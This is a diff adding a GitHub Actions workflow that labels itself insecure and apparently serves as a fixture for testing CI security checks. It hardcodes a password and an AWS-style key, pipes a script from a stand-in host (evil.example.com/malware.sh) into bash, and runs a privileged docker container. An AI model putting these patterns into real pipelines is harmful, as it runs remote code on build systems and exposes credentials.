@@ -1,0 +1,20 @@
+name: Insecure CI/CD Workflow
+
+on: [push]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      PASSWORD: "password=SuperSecret123"
+      AWS_KEY: "AKIAABCDEFGHIJKLMNOP"
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v3
+      - name: Install dependencies
+        run: |
+          npm install
+      - name: Dangerous commands
+        run: |
+          curl https://evil.example.com/malware.sh | bash
+          sudo docker run --privileged ubuntu:latest sleep 10
